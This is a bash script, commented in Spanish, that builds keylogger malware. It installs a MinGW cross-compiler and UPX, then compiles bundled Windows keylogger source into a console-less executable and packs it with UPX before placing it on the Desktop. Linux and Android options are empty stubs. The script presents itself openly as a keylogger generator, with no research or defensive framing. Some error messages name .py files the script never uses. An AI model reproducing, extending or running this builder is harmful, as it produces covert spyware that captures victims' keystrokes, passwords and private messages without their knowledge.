#!/bin/bash

clear

# Cabecera ASCII art
echo ""
echo " █████   ████                     █████                                                         "
echo "░░███   ███░                     ░░███                                                          "
echo " ░███  ███     ██████  █████ ████ ░███         ██████   ███████  ███████  ██████  ████████      "
echo " ░███████     ███░░███░░███ ░███  ░███        ███░░███ ███░░███ ███░░███ ███░░███░░███░░███     "
echo " ░███░░███   ░███████  ░███ ░███  ░███       ░███ ░███░███ ░███░███ ░███░███████  ░███ ░░░      "
echo " ░███ ░░███  ░███░░░   ░███ ░███  ░███      █░███ ░███░███ ░███░███ ░███░███░░░   ░███          "
echo " █████ ░░████░░██████  ░░███████  ███████████░░██████ ░░███████░░███████░░██████  █████         "
echo "░░░░░   ░░░░  ░░░░░░    ░░░░░███ ░░░░░░░░░░░  ░░░░░░   ░░░░░███ ░░░░░███ ░░░░░░  ░░░░░          "
echo "                       ███ ░███                       ███ ░███ ███ ░███                         "
echo "                       ░░██████                       ░░██████ ░░██████                         "
echo "                        ░░░░░░                         ░░░░░░   ░░░░░░                          "
echo ""

# Verificación e instalación de PyInstaller
if ! command -v pyinstaller &> /dev/null
then
    echo "PyInstaller no está instalado. Instalando PyInstaller..."
    pip install pyinstaller
    if [ $? -ne 0 ]; then
        echo "Error: No se pudo instalar PyInstaller. Asegúrate de tener pip instalado y de estar conectado a Internet."
        exit 1
    fi
else
    echo "PyInstaller ya está instalado."
fi

# Verificación e instalación de x86_64-w64-mingw32-g++
if ! command -v x86_64-w64-mingw32-g++ &> /dev/null
then
    echo "x86_64-w64-mingw32-g++ no está instalado. Instalándolo..."
    sudo apt-get install g++-mingw-w64-x86-64
    if [ $? -ne 0 ]; then
        echo "Error: No se pudo instalar x86_64-w64-mingw32-g++. Asegúrate de tener acceso a Internet."
        exit 1
    fi
else
    echo "x86_64-w64-mingw32-g++ ya está instalado."
fi

# Verificación e instalación de UPX
if ! command -v upx &> /dev/null
then
    echo "UPX no está instalado. Instalándolo..."
    sudo apt-get install upx
    if [ $? -ne 0 ]; then
        echo "Error: No se pudo instalar UPX. Asegúrate de tener acceso a Internet."
        exit 1
    fi
else
    echo "UPX ya está instalado."
fi

# Obtener la ruta del escritorio
get_desktop_path() {
    echo "$HOME/Desktop"
}

# Opciones de selección
echo "Please select the target operating system:"
echo " [01] Windows"
echo " [02] Linux (Work in Progress)" 
echo " [03] Android (Work in Progress)"
echo ""
read -p "Select an option: " osOption

case $osOption in
    1 | 01)
        echo ""
        echo " [01] Simple Windows"
        echo " [02] Complex Windows (Work in Progress)"
        echo ""
        read -p "Select an option: " osOptionWind
        echo ""
        
        read -p "Enter the name for the executable file (without extension): " exeName
        desktopPath=$(get_desktop_path)
        
        case $osOptionWind in 
        1 | 01)
            if [ -f "Keylogg/WindowsKey.cpp" ]; then
                exePath="$desktopPath/$exeName.exe"
                x86_64-w64-mingw32-g++ -o "$exePath" Keylogg/WindowsKey.cpp -static -mwindows
                upx --best --lzma "$exePath"
                echo "Executable created: $exePath"
            else
                echo "Error: WindowsKey.py not found!"
            fi
            ;;
        2 | 02)
            if [ -f "Keylogg/WindowsKey2.cpp" ]; then
                exePath="$desktopPath/$exeName.exe"
                x86_64-w64-mingw32-g++ -o "$exePath" Keylogg/WindowsKey2.cpp -static -mwindows
                upx --best --lzma "$exePath"
                echo "Executable created: $exePath"
            else
                echo "Error: WindowsKey2.py not found!"
            fi
            ;;
        *)
            echo "Invalid option for Windows keylogger."
            ;;
        esac
        ;;
    2 | 02)
        echo "Creating Linux keylogger..."
        # Aquí añadirías el código para crear un keylogger para Linux
        ;;
    3 | 03)
        echo "Creating Android keylogger..."
        # Aquí añadirías el código para crear un keylogger para Android
        ;;
    *)
        echo "Invalid option. Exiting..."
        ;;
esac

echo ""
read -p "Press any key to exit..."
./noxk1.sh
